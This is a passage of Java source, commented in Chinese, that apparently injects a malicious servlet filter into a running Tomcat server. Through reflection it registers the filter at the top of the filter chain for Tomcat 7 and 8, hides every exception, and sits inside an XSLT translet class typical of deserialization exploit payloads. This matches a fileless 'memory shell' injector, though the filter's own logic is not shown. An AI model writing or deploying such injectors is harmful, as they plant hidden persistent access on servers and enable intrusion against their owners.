
                //设置 FilterMap
                //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                Class filterMapClass = null;
                try {
                    filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
                } catch (ClassNotFoundException e) {
                    filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                }

                //使用 addFilterMapBefore 会自动把我们创建的 filterMap 丢到第一位去，无需在手动排序了
                //其他中间件应该也是类似的
                Object filterMap = filterMapClass.newInstance();
                filterMap.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterMap, filterName);
                filterMap.getClass().getDeclaredMethod("setDispatcher", String.class).invoke(filterMap, DispatcherType.REQUEST.name());
                filterMap.getClass().getDeclaredMethod("addURLPattern", String.class).invoke(filterMap, urlPattern);
                standardContext.getClass().getDeclaredMethod("addFilterMapBefore", filterMapClass).invoke(standardContext, filterMap);

                //设置 FilterConfig
                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDefClass);
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
                map.put(filterName, filterConfig);
            }
        }catch(Exception e){
            //pass
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
